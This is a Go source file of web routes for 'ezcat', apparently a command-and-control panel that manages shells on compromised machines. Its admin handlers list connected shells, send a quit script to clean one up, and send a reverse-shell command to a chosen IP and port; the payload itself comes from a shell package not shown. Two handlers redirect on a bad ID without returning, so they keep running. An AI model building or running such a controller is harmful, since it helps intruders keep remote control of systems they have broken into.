package routes

import (
	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/ezcat/log"
	"github.com/ngn13/ezcat/shell"
	"github.com/ngn13/ezcat/util"
)

func MIDAdmin(c *fiber.Ctx) error {
  token := c.Cookies("token")
  if !CheckToken(token) {
    log.Warn("Unauth admin request from %s", c.IP())
    return c.Redirect("/")
  }
  return c.Next()
}

func GETAdmin(c *fiber.Ctx) error {
  return c.Render("admin", fiber.Map{
    "token": Token,
    "status": Status,
    "shells": shell.List,
    "ip": util.GetIP(),
  })
}  

func GETRun(c *fiber.Ctx) error {
  uid := c.Query("u")
  if len(uid) != 7 {
    c.Redirect("/admin")
  }

  return c.Render("run", fiber.Map{
    "ip": util.GetIP(),
    "uid": uid,
  })
}

func GETClean(c *fiber.Ctx) error {
  uid := c.Query("u")
  if len(uid) != 7 {
    c.Redirect("/admin")
  }

  indx := shell.Get(uid)
  if indx == -1 {
    return c.Render("admin", fiber.Map{
      "error": "Bad UID",
      "token": Token,
      "status": Status,
      "shells": shell.List,
      "ip": util.GetIP(),
    })
  }

  shell.List[indx].Script = shell.S_QUIT
  shell.List[indx].Hidden = true
  return c.Render("admin", fiber.Map{
    "success": "Cleanup command sent",
    "token": Token,
    "status": Status,
    "shells": shell.List, 
    "ip": util.GetIP(),
  })
}

func POSTRun(c *fiber.Ctx) error {
  body := struct {
    Port  string `form:"port"`
    UID   string `form:"uid"`
    IP    string `form:"ip"`
  }{}

  if err := c.BodyParser(&body); err != nil {
    return util.RenderErr(c, 500, err)
  }

  indx := shell.Get(body.UID)
  if indx == -1 {
    return c.Render("admin", fiber.Map{
      "error": "Bad UID",
      "token": Token,
      "status": Status,
      "shells": shell.List,
      "ip": util.GetIP(),
    })
  }

  shell.List[indx].Script = shell.S_REVERSE(body.IP, body.Port) 
  return c.Render("admin", fiber.Map{
    "success": "Reverse shell command sent",
    "token": Token,
    "status": Status,
    "shells": shell.List, 
    "ip": util.GetIP(),
  })
}

func GETStatus(c *fiber.Ctx) error {
  if shell.Update() {
    UpdateStatus()
  }
  return c.SendString(Status)
}
